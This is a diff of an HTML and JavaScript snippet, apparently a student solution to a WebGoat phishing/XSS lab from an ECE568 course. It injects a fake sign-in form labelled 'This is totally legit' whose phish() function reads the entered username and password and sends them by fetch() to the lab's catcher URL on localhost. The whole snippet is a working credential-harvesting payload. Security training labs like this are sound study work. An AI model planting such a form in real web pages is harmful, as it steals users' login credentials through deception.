@@ -1,13 +1,17 @@
 <script>
-    function myFunction() {
-        var username = document.getElementById("ece568-2020-user").value; 
-        var password = document.getElementById("ece568-2020-pass").value; 
-        var url = "http://localhost:8090/WebGoat/catcher?PROPERTY=yes&phishUsername=" + username + "&phishPassword=" + password;
+    function phish() {
+        var user = document.forms[0]['ece568-2020-user'].value; 
+        var pass = document.forms[0]['ece568-2020-pass'].value;  
+        var url = "http://localhost:8090/WebGoat/catcher?PROPERTY=yes&phishUsername=" + user + "&phishPassword=" + pass;
         fetch(url, {method: "POST"});
     }
 </script>
-<form>
-    username: <input type="text" id="ece568-2020-user">
-    password: <input type="password" id="ece568-2020-pass">
-    <button onclick="myFunction()" id="ece568-2020-submit">submit</button>
+<form id="legit_form">
+	<h4> Please Sign In (This is totally legit): </h4>
+    <b>Username:</b> <input type="text" id="ece568-2020-user">
+	<br>
+    <b>Password:</b> <input type="password" id="ece568-2020-pass">
+	<br>
+    <button onclick="phish()" id="ece568-2020-submit">submit</button>
 </form>
+
